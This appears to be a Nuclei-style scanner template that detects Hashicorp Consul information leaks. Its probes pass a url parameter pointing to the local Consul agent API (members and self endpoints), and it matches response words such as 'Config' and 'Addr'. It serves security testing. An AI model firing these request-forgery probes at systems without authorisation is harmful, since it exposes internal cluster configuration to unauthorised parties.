id: consul-info-leak

info:
  name: Hashicorp Consul Info Leak - Open API
  author: Jake Lo.ai
  severity: medium
  reference: https://www.consul.io/api/agent.html

http:
  - method: GET
    path:
      - "{{BaseURL}}/?url=http://127.0.0.1:8500/v1/agent/members"
      - "{{BaseURL}}/?url=http://127.0.0.1:8500/v1/agent/self"

    matchers:
      - type: word
        part: body
        words:
          - '"Config":'
          - '"Member":'
          - '"Addr":'
